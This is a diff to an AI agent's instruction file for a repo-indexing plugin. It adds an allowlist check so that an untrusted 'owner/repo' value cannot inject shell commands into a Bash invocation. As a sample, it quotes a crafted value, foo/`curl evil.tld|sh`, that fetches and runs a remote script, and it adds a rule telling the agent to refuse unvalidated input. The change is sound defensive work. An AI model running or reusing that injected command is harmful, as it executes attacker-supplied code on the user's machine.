@@ -21,7 +21,25 @@ You index ONE GitHub repo (passed in your prompt) into the project's iEvo cache.
 
 ## Steps — single command (v0.4.0+)
 
-### 1. Invoke `scripts/scan_repo.mjs` via Bash
+### 1. Validate `<repo>`
+
+Before building the Bash command in Step 2, validate the `repo` string. It
+does not come from something the user typed and personally vetted — when
+dispatched from `/ievo:init` it is sourced from `discover.mjs`'s
+`candidates[].source_repo` field, itself pulled from the public,
+externally-writable skills.sh API / a marketplace catalog entry. A crafted
+value such as `` foo/`curl evil.tld|sh` `` is a perfectly legal string in
+that response even though it isn't a legal GitHub slug, and would be
+shell-interpreted the moment Step 2's literal Bash command line is built and
+executed.
+
+Check `repo` against
+`^[A-Za-z0-9](?:[A-Za-z0-9-]{0,38})/[A-Za-z0-9._-]{1,100}$` (matching
+`scan_repo.mjs`'s own `OWNER_REPO_RE` constant). If it fails, refuse and
+return `FAILED: <repo> — invalid owner/repo format` instead of interpolating
+it into Step 2 — do NOT run the Bash command.
+
+### 2. Invoke `scripts/scan_repo.mjs` via Bash
 
 ```bash
 node "${CLAUDE_PLUGIN_ROOT}/scripts/scan_repo.mjs" \
@@ -39,7 +57,7 @@ The script handles ALL the work internally:
 - Render `<owner>-<repo>.md` + `<owner>-<repo>.json` into `--output-dir`
 - Print one-line summary to stdout
 
-### 2. Capture stdout and return as final response
+### 3. Capture stdout and return as final response
 
 The script prints exactly one line:
 ```
@@ -48,7 +66,7 @@ The script prints exactly one line:
 
 Return this line verbatim as your only response. No commentary, no markdown.
 
-### 3. Failure handling
+### 4. Failure handling
 
 - Exit code 0 → success, return the summary line
 - Exit code 2 → network failure with no stale checkout → return `FAILED: <owner>/<repo> — network unreachable`
@@ -61,3 +79,4 @@ Return this line verbatim as your only response. No commentary, no markdown.
 - **Quiet output.** Only the one-line summary at the end. Internal progress noise stays internal.
 - **Idempotent.** Re-running on a fresh checkout produces the same index.
 - **No security audit.** That's `security-check`'s job, invoked later by init.
+- **Never interpolate an unvalidated `repo` into the Step 2 Bash command.** `scan_repo.mjs` enforces its own `OWNER_REPO_RE` allowlist internally, but that only protects paths the script constructs *after* it receives the string — it cannot retroactively protect the Bash command line Step 2 builds to invoke it in the first place. Step 1's allowlist check is what closes that gap; skipping it (e.g. because "the script re-checks anyway") reopens CWE-78 at the agent-prompt level.
